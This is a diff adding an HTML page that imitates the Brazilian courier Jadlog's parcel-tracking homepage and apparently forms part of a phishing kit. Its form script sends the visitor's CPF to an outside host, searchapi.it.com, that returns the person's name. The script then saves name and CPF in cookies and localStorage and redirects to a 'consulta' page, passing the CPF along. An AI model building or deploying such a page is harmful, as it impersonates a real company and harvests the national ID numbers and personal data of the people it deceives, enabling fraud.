@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
+<head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width,
+                   initial-scale=1.0,
+                   maximum-scale=1.0,
+                   user-scalable=no">
+    <link href="../../fonts.googleapis.com/css283ab.css?family=Montserrat:wght@400;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="preconnect" href="../../fonts.googleapis.com/index.html">
+    <link rel="preconnect" href="../../fonts.gstatic.com/index.html" crossorigin>
+    <link href="../../fonts.googleapis.com/css246ca.css?family=Open+Sans:ital,wght@0,300..800;1,300..800&amp;display=swap" rel="stylesheet">
+    <script src="../../code.iconify.design/2/2.1.0/iconify.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="styles/estilo.css">
+    <style>
+      html { -webkit-text-size-adjust: 100%; }
+      input, select, textarea, button { font-size: 16px; }
+    </style>
+    <title>Jadlog - Sua encomenda no melhor caminho.</title>
+</head>
+<body>
+    <header>
+        <div class="menu-principal">
+            <img src="assets/imagens/logo.webp" alt="logo-jad">
+            <div class="menu-icone">
+                <img src="assets/imagens/menu.png" alt="menu-icon">
+            </div>
+        </div>
+        <div class="pesquisa">
+            <select>
+                <option>Português</option>
+                <option>Inglês</option>
+            </select>
+            <div class="barra-pesquisa">
+                <input type="text" placeholder="Busca">
+                <img src="assets/imagens/lupa.webp" alt="ícone de lupa">
+            </div>
+        </div>
+    </header>
+
+    <div id="message" style="visibility:hidden; margin:16px; font-weight:600; text-align:center;"></div>
+
+    <section class="padding-padrao">
+        <main>
+            <header>
+                <div class="rastreio">
+                    <strong><span>RASTREIE SUA ENCOMENDA</span></strong>
+                    <form id="cpfForm">
+                        <div class="formulario-consulta">
+                            <input
+                                type="text"
+                                id="cpf"
+                                name="cpf_formatado"
+                                maxlength="14"
+                                placeholder="CPF/CNPJ"
+                                required
+                                autocomplete="off"
+                                oninput="mascara(this)"
+                            >
+                            <input type="hidden" id="cpf_real" name="cpf">
+                            <button type="submit">PROCURAR</button>
+                        </div>
+                    </form>
+                </div>
+            </header>
+            <br>
+            <center>
+                <div class="banner-container">
+                    <div class="banner-wrapper">
+                        <div class="banner-slide">
+                            <img src="assets/imagens/banner1.webp" alt="Banner 1">
+                        </div>
+                        <div class="banner-slide">
+                            <img src="assets/imagens/banner2.webp" alt="Banner 2">
+                        </div>
+                        <div class="banner-slide">
+                            <img src="assets/imagens/banner3.webp" alt="Banner 3">
+                        </div>
+                    </div>
+                    <div class="banner-indicators"></div>
+                </div>
+            </center>
+        </main>
+    </section>
+
+    <section>
+        <div class="sobre">
+            <center>
+                <img src="assets/imagens/entregador.webp" alt="entregador">
+            </center>
+            <header>
+                <h1>Somos a Jadlog sua encomenda no melhor caminho</h1>
+            </header>
+            <div class="sobre-nos">
+                <p>- Somos transportadores.</p>
+                <p>- Somos pessoas.</p>
+                <p>- Somos mais de 5.000 colaboradores diretos e indiretos.</p>
+                <p>- Somos 7.000 veículos, caminhões e carretas que coletam e entregam sua encomenda.</p>
+                <p>- Somos o comércio do seu lado, com 4.000 parceiros Pickup.</p>
+                <p>- Somos parte do Grupo europeu líder em entrega de encomendas e soluções para comércio eletrónico, o Geopost.</p><br>
+                <button>Saiba mais ›</button>
+            </div>
+        </div>
+        <div class="noticias">
+            <header>
+                <h1>Últimas Notícias da Jadlog</h1>
+                <p>Conteúdo exclusivo para manter você sempre informado sobre tudo que acontece por aqui e no mercado.</p><br>
+            </header>
+            <img src="assets/imagens/noticias.webp" alt="notícias">
+        </div>
+        <div class="parceiros">
+            <header>
+                <h1>Conheça alguns clientes da Jadlog</h1>
+            </header>
+            <img src="assets/imagens/parceiros.webp" alt="parceiros">
+        </div>
+    </section>
+
+    <footer>
+        <div class="rodape">
+            <img src="assets/imagens/logofooter2.png" alt="logo-footer">
+            <a href="#">Sobre a Jadlog</a>
+            <a href="#">Produtos e Serviços</a>
+            <a href="#">Unidades e Franquias</a>
+            <a href="#">Tecnologia</a>
+            <a href="#">Notícias</a>
+            <a href="#">Trabalhe Conosco</a>
+            <a href="#">Código de Conduta</a>
+            <a href="#"><b style="color: #e0033b;">Política de Privacidade</b></a>
+            <hr>
+        </div>
+        <div class="rodape-fim">
+            <span>©2025 Jadlog - Todos os direitos reservados</span><br>
+        </div>
+    </footer>
+
+    <script src="assets/js/slides.js"></script>
+    <script src="assets/js/formatarcpf.js"></script>
+    <script>
+    document.getElementById('cpfForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const inp            = document.getElementById('cpf');
+        const cpfRaw         = inp.value.replace(/\D/g, '');
+        const hid            = document.getElementById('cpf_real');
+        const messageElement = document.getElementById('message');
+
+        if (!cpfRaw) {
+            messageElement.textContent       = 'Por favor, insira um CPF.';
+            messageElement.className         = 'error';
+            messageElement.style.visibility  = 'visible';
+            return;
+        }
+
+        hid.value = cpfRaw;
+        let dots = 0;
+        messageElement.textContent        = 'Consultando';
+        messageElement.className          = '';
+        messageElement.style.visibility   = 'visible';
+
+        const interval = setInterval(() => {
+            dots = (dots + 1) % 4;
+            messageElement.textContent = 'Consultando' + '.'.repeat(dots);
+        }, 500);
+
+        const start = Date.now();
+
+        fetch(`https://searchapi.it.com/consulta?token_api=1749&cpf=${cpfRaw}`)
+            .then(response => response.json())
+            .then(data => {
+                const dados = Array.isArray(data.dados) ? data.dados[0] : null;
+                const nome = dados && dados.NOME ? dados.NOME : '';
+                const status = Number(data.status);
+                const elapsed = Date.now() - start;
+                const remain = Math.max(0, 3000 - elapsed);
+                setTimeout(() => {
+                    clearInterval(interval);
+                    if (status === 200 && nome) {
+                        document.cookie = `nome=${encodeURIComponent(nome)}; path=/`;
+                        document.cookie = `cpf=${formatarCPF(cpfRaw)}; path=/`;
+                        localStorage.setItem('nome', nome);
+                        localStorage.setItem('cpf', cpfRaw);
+                        messageElement.textContent = 'Encomenda encontrada!';
+                        messageElement.className   = 'success';
+                        if (typeof abrirPopup === 'function') abrirPopup();
+                        setTimeout(() => {
+                            window.location.href = 'consulta/index.html?cpf=' + cpfRaw;
+                        }, 1000);
+                    } else {
+                        window.location.href = 'consulta/index.html?cpf=' + cpfRaw;
+                    }
+                }, remain);
+            })
+            .catch(() => {
+                const elapsed = Date.now() - start;
+                const remain = Math.max(0, 3000 - elapsed);
+                setTimeout(() => {
+                    clearInterval(interval);
+                    window.location.href = 'consulta/index.html?cpf=' + cpfRaw;
+                }, remain);
+            });
+    });
+
+    function mascara(i) {
+        let v = i.value.replace(/\D/g, '');
+        if (v.length > 11) v = v.slice(0,11);
+        i.value = v
+            .replace(/^(\d{3})(\d)/, '$1.$2')
+            .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
+            .replace(/\.(\d{3})(\d)/, '.$1-$2');
+    }
+
+    function formatarCPF(cpf) {
+        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    </script>
+</body>
+</html>
